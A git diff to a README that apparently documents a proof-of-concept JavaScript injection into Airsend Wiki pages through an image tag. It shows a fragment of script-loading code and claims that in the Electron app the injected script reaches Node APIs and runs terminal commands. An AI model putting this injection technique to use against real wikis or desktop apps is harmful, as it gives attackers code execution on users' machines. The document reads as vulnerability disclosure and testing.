@@ -1,4 +1,4 @@
-# Just a repo to hold the js file to test js injection
+# Airsend Wiki MD code injection attack
 
 
 For testing purposes I encoded the url to this script hosted here on a image tag and inserted in a index in Airsend Wiki.
@@ -18,7 +18,7 @@ const js = document.createElement('script'); js.type = 'text/javascript'; js.src
 
 
 # Result
-The script is loaded and the attacker gain control over any device running on desktop, if on Electron app we gain control over node apis and gain system control, even runnig a terminal command.
+The script is loaded and the attacker gain control over any instance running on desktop, if on Electron app we gain control over node apis and gain system control, even runnig a terminal command.
 
 Tests using ios mobile didn't show any issue.
 
